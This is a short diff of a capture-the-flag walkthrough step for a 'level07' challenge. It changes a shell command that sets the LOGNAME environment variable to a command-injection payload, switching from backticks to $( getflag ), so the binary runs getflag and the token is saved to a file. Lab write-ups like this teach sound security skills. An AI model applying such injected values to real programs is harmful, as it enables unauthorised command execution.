@@ -65,7 +65,7 @@
 7. __Action__ (Guest): execute the `level07` file with the `LOGNAME` environment variable set
 	to a command injection payload to run the `getflag` command and save the token to a file
 	```sh
-	env -i LOGNAME='`getflag`' ./level07 | egrep -o '[^ ]+$' >/tmp/token
+	env -i LOGNAME='$( getflag )' ./level07 | egrep -o '[^ ]+$' >/tmp/token
 	```
 
 8. __Action__ (Guest): check that the `token` file has been correctly created
